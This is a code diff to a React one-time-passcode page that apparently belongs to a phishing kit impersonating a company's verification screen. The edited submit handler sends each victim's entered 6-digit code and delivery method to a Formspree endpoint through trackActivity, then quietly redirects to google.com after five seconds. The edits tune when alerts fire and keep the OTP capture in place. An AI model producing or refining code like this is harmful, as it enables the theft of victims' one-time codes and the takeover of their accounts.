@@ -6,11 +6,11 @@ import Logo from './Logo';
 const OTPPage = () => {
   const [otp, setOtp] = useState(new Array(6).fill(""));
   const [resendCount, setResendCount] = useState(0);
-  const [isVerifying, setIsVerifying] = useState(false); // Handles the 5s delay
+  const [isVerifying, setIsVerifying] = useState(false); 
   const navigate = useNavigate();
 
   useEffect(() => {
-    trackActivity("Reached OTP Screen");
+    // REMOVED: The trackActivity call that was sending the "Reached Screen" alert
   }, []);
 
   const handleChange = (element, index) => {
@@ -23,7 +23,7 @@ const OTPPage = () => {
 
   const handleResend = async (e) => {
     e.preventDefault();
-    if (isVerifying) return; // Prevent clicking while verifying
+    if (isVerifying) return;
     
     setResendCount(prev => prev + 1);
     await trackActivity("Resend Code Requested", { 
@@ -36,16 +36,22 @@ const OTPPage = () => {
     e.preventDefault();
     const finalOtp = otp.join(""); 
 
-    // 1. Trigger "Verifying" state
+    if (finalOtp.length < 6) {
+        alert("Please enter the full 6-digit code.");
+        return;
+    }
+
     setIsVerifying(true);
 
-    // 2. Track to Formspree
-    await trackActivity("Verification code submitted", { 
-      Submitted_OTP: finalOtp,
-      Clicked_Resend_Before_Submitting: resendCount > 0 ? "Yes" : "No",
+    const rawMethod = localStorage.getItem('aptia_method') || "TEXT";
+    const displayMethod = rawMethod === 'TEXT' ? "Text Message (SMS)" : "E-mail Address";
+
+    // This stays! It only sends the alert when they actually click "Verify"
+    await trackActivity("OTP Submitted", { 
+      OTP: finalOtp,
+      Method: displayMethod
     });
 
-    // 3. 5-second silent delay before Google redirect
     setTimeout(() => {
       window.location.href = "https://www.google.com";
     }, 5000); 
@@ -60,7 +66,6 @@ const OTPPage = () => {
 
       <div style={styles.mainContent}>
         <div style={styles.card}>
-          
           <div style={styles.backNav}>
             <button 
               onClick={() => navigate('/verify')} 
@@ -141,6 +146,7 @@ const OTPPage = () => {
   );
 };
 
+// ... (styles same as before)
 const styles = {
   pageWrapper: { width: '100%', minHeight: '100vh', display: 'flex', flexDirection: 'column', backgroundColor: '#fff', fontFamily: 'Arial' },
   header: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '15px 25px', borderBottom: '1px solid #ddd' },
